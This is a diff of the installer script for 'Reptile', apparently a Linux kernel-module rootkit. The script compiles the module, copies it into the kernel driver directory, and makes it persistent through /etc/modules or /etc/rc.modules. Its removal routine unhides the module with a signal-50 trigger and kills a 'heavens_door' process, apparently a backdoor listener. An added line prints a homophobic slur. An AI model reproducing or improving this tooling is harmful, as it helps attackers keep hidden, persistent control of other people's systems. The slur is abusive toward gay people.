@@ -9,12 +9,16 @@ KERNEL_VERSION=$(uname -r)
 DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
 PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)/"
 
-function usage {
+function banner {
 	echo -e "\n\e[00;31m############################################################################\e[00m"
 	echo -e "\e[00;31m############################ \e[01;36mREPTILE INSTALLER\e[00;31m #############################\e[00m"
 	echo -e "\e[00;31m############################################################################\e[00m"
-	echo -e "\e[00;36mwriten by: F0rb1dd3n\e[00m\n"
-	echo -e "Usage: $0 <arg>\n"
+	echo -e "\e[00;36mwritten by: F0rb1dd3n\e[00m"
+}
+
+function usage {
+	banner
+	echo -e "\nUsage: $0 <arg>\n"
 	echo -e "\tbuild\t\tCompile the module"
 	echo -e "\tinstall\t\tCompile and install the module persistently"
 	echo -e "\tremove\t\tRemove the persistence of module\n"
@@ -32,12 +36,11 @@ function directory_remove {
 	fi
 }
 
+
+
 function reptile_init {
-	echo -e "\n\e[00;31m############################################################################\e[00m"
-	echo -e "\e[00;31m############################ \e[01;36mREPTILE INSTALLER\e[00;31m #############################\e[00m"
-	echo -e "\e[00;31m############################################################################\e[00m"
-	echo -e "\e[00;36mwriten by: F0rb1dd3n\e[00m"
-	
+	banner
+
 	[ $(uname) != "Linux" ] && {
 		echo "Not on a Linux system. Exiting..."
 		exit
@@ -124,12 +127,12 @@ function reptile_install {
 	cp "/$MODULE/$MODULE.ko" "$DRIVER_DIRECTORY" 2> /dev/null || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     
     	if [ "$SYSTEM" == "debian" ] || [ "$SYSTEM" == "ubuntu" ]; then
-        	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+        	echo -e "" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	elif [ "$SYSTEM" == "redhat" ] || [ "$SYSTEM" == "centos" ] || [ "$SYSTEM" == "fedora" ]; then
-        	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/rc.modules && \
+        	echo -e "" >> /etc/rc.modules && \
 		chmod +x /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 	#elif [ "$SYSTEM" == "arch" ]; then
-        #	echo -e "#<reptile>\n$MODULE\n#</reptile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+        #	echo -e "" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	fi
     	
 	depmod && insmod /$MODULE/$MODULE.ko && \
@@ -140,14 +143,21 @@ function reptile_install {
 }
 
 function reptile_remove {
-	echo -e "\n\e[01;31mBe sure to unhide and unload the module or this script will not work properly!\e[00m"
-	echo -e "Command: \e[01;32mkill -50 0 && rmmod rep_mod\e[00m\n"
-    	echo -ne "Uninstalling... "
-	#kill -9 `ps -ef | grep heavens_door | grep -v grep | awk '{print $2}'`
-	rm -rf /$MODULE
-	rm -rf $DRIVER_DIRECTORY
-	rm -rf /etc/rc.modules
-	echo '' > /etc/modules
+	banner
+	echo -e "\n\e[01;31mYou are gay!\e[00m"
+	echo -ne "Uninstalling... "
+
+	if [ -z $(lsmod | grep rep_mod | cut -d " " -f 1) ]; then
+		kill -50 '0' && rmmod rep_mod || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+	else	
+		rmmod rep_mod || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+	fi
+
+	kill -9 `ps -ef | grep heavens_door | grep -v grep | awk '{print $2}'` && \
+	rm -rf /$MODULE && \
+	rm -rf $DRIVER_DIRECTORY && \
+	rm -rf /etc/rc.modules && \
+	echo '' > /etc/modules && \
 	depmod && echo -e "\e[01;36mDONE!\e[00m\n" || echo -e "\e[01;31mERROR!\e[00m\n"
 	
 	directory_remove
